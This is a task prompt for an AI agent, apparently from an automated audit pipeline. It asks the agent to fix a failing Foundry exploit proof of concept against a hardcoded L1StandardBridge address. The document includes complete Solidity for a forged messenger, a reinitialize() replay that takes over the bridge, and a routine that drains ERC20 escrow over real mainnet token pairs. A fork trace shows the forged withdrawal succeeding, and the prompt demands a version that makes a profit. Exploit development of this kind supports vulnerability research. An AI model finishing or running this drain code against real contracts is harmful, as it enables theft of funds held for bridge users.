You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: L1StandardBridge can be reinitialized repeatedly to replace the trusted messenger and seize bridge funds
- claim: `initialize()` is protected by `reinitializer(2)`, but its preceding `clearLegacySlot` modifier unconditionally executes `sstore(0, 0)`. In this inheritance layout, OpenZeppelin `Initializable` stores `_initialized` and `_initializing` in slot 0, so every call resets the initialization guard before the reinitializer check runs. Any caller can therefore invoke `initialize()` again and overwrite `messenger` with an attacker-controlled contract.
- impact: Once `messenger` is replaced, the attacker can satisfy `onlyOtherBridge` with a fake messenger that reports `OTHER_BRIDGE` as `xDomainMessageSender()`. That lets the attacker call `finalizeETHWithdrawal` and `finalizeERC20Withdrawal` to release arbitrary ETH and escrowed ERC20s from the bridge, resulting in full bridge takeover and fund drain.
- exploit_paths: ["Call `L1StandardBridge.initialize(attackerMessenger)` after deployment; `clearLegacySlot` zeroes slot 0, allowing `reinitializer(2)` to pass again and store the attacker messenger.", "Have `attackerMessenger.xDomainMessageSender()` return `address(OTHER_BRIDGE)` and call `finalizeETHWithdrawal(...)` or `finalizeERC20Withdrawal(...)` from `attackerMessenger`.", "`onlyOtherBridge` now accepts the forged call because it only checks `msg.sender == address(messenger)` and `messenger.xDomainMessageSender() == address(OTHER_BRIDGE)`, so escrowed funds can be withdrawn to attacker-chosen recipients."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IL1StandardBridge {
    function initialize(address _messenger) external;

    function finalizeETHWithdrawal(
        address _from,
        address _to,
        uint256 _amount,
        bytes calldata _extraData
    ) external payable;

    function finalizeERC20Withdrawal(
        address _l1Token,
        address _l2Token,
        address _from,
        address _to,
        uint256 _amount,
        bytes calldata _extraData
    ) external;

    function MESSENGER() external view returns (address);

    function deposits(address _localToken, address _remoteToken) external view returns (uint256);
}

contract AttackerMessenger {
    IL1StandardBridge public immutable bridge;
    address public immutable forgedOtherBridge;
    address public immutable operator;

    constructor(address _bridge, address _forgedOtherBridge, address _operator) {
        bridge = IL1StandardBridge(_bridge);
        forgedOtherBridge = _forgedOtherBridge;
        operator = _operator;
    }

    function xDomainMessageSender() external view returns (address) {
        return forgedOtherBridge;
    }

    function triggerFinalizeETHWithdrawal(
        address from,
        address to,
        uint256 amount,
        bytes calldata extraData
    ) external payable {
        require(msg.sender == operator, "operator-only");
        bridge.finalizeETHWithdrawal{value: amount}(from, to, amount, extraData);
    }

    function triggerFinalizeERC20Withdrawal(
        address l1Token,
        address l2Token,
        address from,
        address to,
        uint256 amount,
        bytes calldata extraData
    ) external {
        require(msg.sender == operator, "operator-only");
        bridge.finalizeERC20Withdrawal(l1Token, l2Token, from, to, amount, extraData);
    }
}

contract FlawVerifier {
    address public constant TARGET = address(uint160(0x0040C31236B228935b0329eFF066B1AD96e319595e));
    address public constant OTHER_BRIDGE = address(uint160(0x004200000000000000000000000000000000000010));
    address internal constant PROBE_RECIPIENT = address(uint160(0x00000000000000000000000000000000000000bEEF));

    address internal constant WETH = address(uint160(0x00C02aaA39b223FE8D0A0E5C4F27eAD9083C756Cc2));
    address internal constant DAI = address(uint160(0x006B175474E89094C44Da98b954EedeAC495271d0F));
    address internal constant LINK = address(uint160(0x00514910771AF9Ca656af840dff83E8264EcF986CA));
    address internal constant SNX = address(uint160(0x00C011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F));
    address internal constant UNI = address(uint160(0x001f9840a85d5aF5bf1D1762F925BDADdC4201F984));
    address internal constant LUSD = address(uint160(0x005f98805A4E8be255a32880FDeC7F6728C6568bA0));
    address internal constant FRAX = address(uint160(0x00853d955aCEf822Db058eb8505911ED77F175b99e));
    address internal constant USDC = address(uint160(0x00A0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48));
    address internal constant USDT = address(uint160(0x00dAC17F958D2ee523a2206206994597C13D831ec7));
    address internal constant WBTC = address(uint160(0x002260FAC5E5542a773Aa44fBCfeDf7C193bc2C599));

    address internal constant OP_WETH = address(uint160(0x004200000000000000000000000000000000000006));
    address internal constant OP_DAI = address(uint160(0x00DA10009cBd5D07dd0CeCc66161FC93D7c9000da1));
    address internal constant OP_LINK = address(uint160(0x00350a791Bfc2C21F9Ed5d10980Dad2e2638ffa7f6));
    address internal constant OP_SNX = address(uint160(0x008700dAec35af8fF88C16bdf041006c17c5C68Ba3));
    address internal constant OP_UNI = address(uint160(0x006fd9d7AD17242c41f7131d257212c54A0e816691));
    address internal constant OP_LUSD = address(uint160(0x00c40F949F8a4e094D1b49a23ea9241D289B7b2819));
    address internal constant OP_FRAX = address(uint160(0x002E3D870790dC77A83DD1d18184Acc7439A53f475));
    address internal constant OP_USDC = address(uint160(0x007F5c764cBc14f9669B88837ca1490cCa17c31607));
    address internal constant OP_USDT = address(uint160(0x0094b008aA00579c1307B0EF2c499aD98a8ce58e58));
    address internal constant OP_WBTC = address(uint160(0x0068f180fcCe6836688e9084f035309E29Bf0A2095));

    struct TokenPair {
        address l1Token;
        address l2Token;
    }

    bool public executed;
    bool public messengerTakeoverValidated;
    bool public forgedMessengerBypassValidated;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    string public outcome;

    address private _profitToken;
    uint256 private _profitAmount;

    IL1StandardBridge internal immutable l1StandardBridge;
    AttackerMessenger public immutable attackerMessenger;

    constructor() {
        l1StandardBridge = IL1StandardBridge(TARGET);
        attackerMessenger = new AttackerMessenger(TARGET, OTHER_BRIDGE, address(this));
        outcome = "not-run";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }

        executed = true;
        messengerTakeoverValidated = false;
        forgedMessengerBypassValidated = false;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        _profitToken = address(0);
        _profitAmount = 0;

        // Stage 1: replay initialize() after clearLegacySlot() zeroes Initializable slot 0,
        // resetting the reinitializer guard and replacing the trusted messenger.
        if (!_reinitializeBridge()) {
            outcome = "refuted-stage-1-initialize-replay-failed";
            hypothesisRefuted = true;
            return;
        }

        address currentMessenger;
        try l1StandardBridge.MESSENGER() returns (address messenger_) {
            currentMessenger = messenger_;
        } catch {
            outcome = "refuted-stage-1-messenger-getter-failed";
            hypothesisRefuted = true;
            return;
        }

        if (currentMessenger != address(attackerMessenger)) {
            outcome = "refuted-stage-1-messenger-not-replaced";
            hypothesisRefuted = true;
            return;
        }
        messengerTakeoverValidated = true;

        // Stage 2: forged messenger identity must match the bridge's onlyOtherBridge expectation.
        if (!_validateForgedMessengerIdentity()) {
            outcome = "refuted-stage-2-forged-xdomain-sender-mismatch";
            hypothesisRefuted = true;
            return;
        }

        // Access-control proof. Amount 0 preserves the exploit causality while avoiding any need
        // for temporary funding. The requested v2-flashswap funding path is therefore unnecessary
        // in this fork context because the profitable leg drains pre-existing ERC20 escrow.
        if (!_probeFinalizeETHWithdrawalBypass()) {
            outcome = "refuted-stage-2-forged-finalizeethwithdrawal-call-failed";
            hypothesisRefuted = true;
            return;
        }
        forgedMessengerBypassValidated = true;

        // Profit stage: use the same forged messenger path to release existing bridge escrow for
        // canonical L1/L2 token pairs already present on-chain at the fork block.
        if (_attemptERC20Drain()) {
            hypothesisValidated = true;
            outcome = "validated-with-profit";
            return;
        }

        outcome = "refuted-stage-3-no-funded-erc20-escrow-pair-found";
        hypothesisRefuted = true;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external pure returns (string memory) {
        return
            "L1StandardBridge.initialize(attackerMessenger) -> attackerMessenger.xDomainMessageSender() returns address(OTHER_BRIDGE) -> forged messenger calls finalizeETHWithdrawal(...) / finalizeERC20Withdrawal(...)";
    }

    function _reinitializeBridge() internal returns (bool) {
        try l1StandardBridge.initialize(address(attackerMessenger)) {
            return true;
        } catch {
            return false;
        }
    }

    function _validateForgedMessengerIdentity() internal view returns (bool) {
        try attackerMessenger.xDomainMessageSender() returns (address sender_) {
            return sender_ == OTHER_BRIDGE;
        } catch {
            return false;
        }
    }

    function _probeFinalizeETHWithdrawalBypass() internal returns (bool) {
        try attackerMessenger.triggerFinalizeETHWithdrawal(address(this), PROBE_RECIPIENT, 0, bytes("")) {
            return true;
        } catch {
            return false;
        }
    }

    function _attemptERC20Drain() internal returns (bool) {
        TokenPair[] memory pairs = _candidatePairs();
        uint256 pairCount = pairs.length;

        for (uint256 i = 0; i < pairCount; ++i) {
            address l1Token = pairs[i].l1Token;
            address l2Token = pairs[i].l2Token;

            uint256 bridgeBalance = _tokenBalance(l1Token, TARGET);
            if (bridgeBalance == 0) {
                continue;
            }

            uint256 escrowed;
            try l1StandardBridge.deposits(l1Token, l2Token) returns (uint256 amount_) {
                escrowed = amount_;
            } catch {
                continue;
            }

            if (escrowed == 0) {
                continue;
            }

            uint256 drainAmount = _min(bridgeBalance, escrowed);
            if (drainAmount == 0) {
                continue;
            }

            uint256 beforeBalance = _tokenBalance(l1Token, address(this));

            try attackerMessenger.triggerFinalizeERC20Withdrawal(
                l1Token,
                l2Token,
                address(this),
                address(this),
                drainAmount,
                bytes("")
            ) {
                uint256 afterBalance = _tokenBalance(l1Token, address(this));
                if (afterBalance > beforeBalance) {
                    _profitToken = l1Token;
                    _profitAmount = afterBalance - beforeBalance;
                    return true;
                }
            } catch {}
        }

        return false;
    }

    function _tokenBalance(address token, address account) internal view returns (uint256) {
        try IERC20Like(token).balanceOf(account) returns (uint256 amount_) {
            return amount_;
        } catch {
            return 0;
        }
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _candidatePairs() internal pure returns (TokenPair[] memory pairs) {
        pairs = new TokenPair[](10);
        pairs[0] = TokenPair({l1Token: WETH, l2Token: OP_WETH});
        pairs[1] = TokenPair({l1Token: DAI, l2Token: OP_DAI});
        pairs[2] = TokenPair({l1Token: LINK, l2Token: OP_LINK});
        pairs[3] = TokenPair({l1Token: SNX, l2Token: OP_SNX});
        pairs[4] = TokenPair({l1Token: UNI, l2Token: OP_UNI});
        pairs[5] = TokenPair({l1Token: LUSD, l2Token: OP_LUSD});
        pairs[6] = TokenPair({l1Token: FRAX, l2Token: OP_FRAX});
        pairs[7] = TokenPair({l1Token: USDC, l2Token: OP_USDC});
        pairs[8] = TokenPair({l1Token: USDT, l2Token: OP_USDT});
        pairs[9] = TokenPair({l1Token: WBTC, l2Token: OP_WBTC});
    }
}

```

forge stdout (tail):
```
   └─ ← [Return] AttackerMessenger: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
    │   │   └─ ← [Return] AttackerMessenger: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
    │   ├─ [246] AttackerMessenger::xDomainMessageSender() [staticcall]
    │   │   └─ ← [Return] 0x4200000000000000000000000000000000000010
    │   ├─ [12961] AttackerMessenger::triggerFinalizeETHWithdrawal(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x000000000000000000000000000000000000bEEF, 0, 0x)
    │   │   ├─ [11772] 0x40C31236B228935b0329eFF066B1AD96e319595e::finalizeETHWithdrawal(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x000000000000000000000000000000000000bEEF, 0, 0x)
    │   │   │   ├─ [347] 0xba86Cd28d937F1CC7C74a365368477408578364A::b7947262() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [10018] 0xE468B43b4Ae4D750Cd6a5D7EdACC1A751302c99C::finalizeETHWithdrawal(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x000000000000000000000000000000000000bEEF, 0, 0x) [delegatecall]
    │   │   │   │   ├─ [246] AttackerMessenger::xDomainMessageSender() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x4200000000000000000000000000000000000010
    │   │   │   │   ├─  emit topic 0: 0x2ac69ee804d9a7a0984249f508dfab7cb2534b465b6ce1580f99a38ba9c5e631
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x000000000000000000000000000000000000000000000000000000000000beef
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─  emit topic 0: 0x31b2166ff604fc5672ea5df08a78081d2bc6d746cadce880747f3643d819e83d
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x000000000000000000000000000000000000000000000000000000000000beef
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [0] 0x000000000000000000000000000000000000bEEF::fallback()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Return]
    │   │   └─ ← [Stop]
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x40C31236B228935b0329eFF066B1AD96e319595e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0x40C31236B228935b0329eFF066B1AD96e319595e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2655] 0x514910771AF9Ca656af840dff83E8264EcF986CA::balanceOf(0x40C31236B228935b0329eFF066B1AD96e319595e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [14120] 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F::balanceOf(0x40C31236B228935b0329eFF066B1AD96e319595e) [staticcall]
    │   │   ├─ [8596] 0xd0dA9cBeA9C3852C5d63A95F9ABCC4f6eA0F9032::balanceOf(0x40C31236B228935b0329eFF066B1AD96e319595e)
    │   │   │   ├─ [2486] 0x5b1b5fEa1b99D83aD479dF0C222F0492385381dD::balanceOf(0x40C31236B228935b0329eFF066B1AD96e319595e) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2797] 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984::balanceOf(0x40C31236B228935b0329eFF066B1AD96e319595e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2487] 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0::balanceOf(0x40C31236B228935b0329eFF066B1AD96e319595e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(0x40C31236B228935b0329eFF066B1AD96e319595e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [9815] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0x40C31236B228935b0329eFF066B1AD96e319595e) [staticcall]
    │   │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0x40C31236B228935b0329eFF066B1AD96e319595e) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [5031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0x40C31236B228935b0329eFF066B1AD96e319595e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2795] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::balanceOf(0x40C31236B228935b0329eFF066B1AD96e319595e) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [390] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [410] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 4.20s (3.96s CPU time)

Ran 1 test suite in 4.27s (4.20s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 233239)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
